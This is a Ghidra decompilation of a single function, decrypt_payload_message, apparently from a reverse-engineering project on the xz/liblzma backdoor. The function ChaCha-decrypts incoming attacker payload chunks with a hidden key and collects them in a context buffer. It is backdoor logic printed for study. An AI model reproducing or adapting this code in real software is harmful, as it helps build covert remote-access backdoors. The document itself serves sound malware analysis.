// /home/kali/xzre-ghidra/xzregh/108D50_decrypt_payload_message.c
// Function: decrypt_payload_message @ 0x108D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall decrypt_payload_message(key_payload_t * payload, size_t payload_size, global_context_t * ctx)


BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_context_t *ctx)

{
  u16 *in;
  u64 uVar1;
  BOOL BVar2;
  size_t header_size_1;
  long lVar3;
  size_t header_size_2;
  u8 *data_1;
  int inl;
  size_t header_size_3;
  size_t header_size;
  u8 local_71 [65];
  u8 *data;
  
  local_71[0] = '\0';
  local_71[1] = '\0';
  local_71[2] = '\0';
  local_71[3] = '\0';
  local_71[4] = '\0';
  local_71[5] = '\0';
  local_71[6] = '\0';
  local_71[7] = '\0';
  local_71[8] = '\0';
  local_71[9] = '\0';
  local_71[10] = '\0';
  local_71[0xb] = '\0';
  local_71[0xc] = '\0';
  local_71[0xd] = '\0';
  local_71[0xe] = '\0';
  local_71[0xf] = '\0';
  data_1 = local_71 + 0x10;
  for (lVar3 = 0x29; lVar3 != 0; lVar3 = lVar3 + -1) {
    *data_1 = '\0';
    data_1 = data_1 + 1;
  }
  if (payload == (key_payload_t *)0x0) {
    if (ctx == (global_context_t *)0x0) {
      return 0;
    }
  }
  else {
    if (ctx == (global_context_t *)0x0) {
      return 0;
    }
    if (ctx->payload_state == 3) {
      return 1;
    }
    if ((0x12 < payload_size) && (ctx->payload_state < 2)) {
      header_size_3 = *(size_t *)&payload->field0_0x0;
      header_size = *(size_t *)((long)&payload->field0_0x0 + 8);
      BVar2 = secret_data_get_decrypted(local_71,ctx);
      if (BVar2 != 0) {
        in = &(payload->field0_0x0).field1.body_length;
        inl = (int)payload_size + -0x10;
        BVar2 = chacha_decrypt((u8 *)in,inl,local_71,(u8 *)&header_size_3,(u8 *)in,
                               ctx->imported_funcs);
        if (((BVar2 != 0) &&
            (header_size_2 = (size_t)(payload->field0_0x0).field1.body_length,
            header_size_2 <= payload_size - 0x12)) &&
           (uVar1 = ctx->current_data_size, header_size_2 < ctx->payload_data_size - uVar1)) {
          data = ctx->payload_data;
          for (header_size_1 = 0; header_size_2 != header_size_1; header_size_1 = header_size_1 + 1)
          {
            data[header_size_1 + uVar1] = *(u8 *)((long)&payload->field0_0x0 + header_size_1 + 0x12)
            ;
          }
          ctx->current_data_size = ctx->current_data_size + header_size_2;
          BVar2 = chacha_decrypt((u8 *)in,inl,local_71,(u8 *)&header_size_3,(u8 *)in,
                                 ctx->imported_funcs);
          if (BVar2 != 0) {
            return 1;
          }
        }
      }
    }
  }
  ctx->payload_state = 0xffffffff;
  return 0;
}

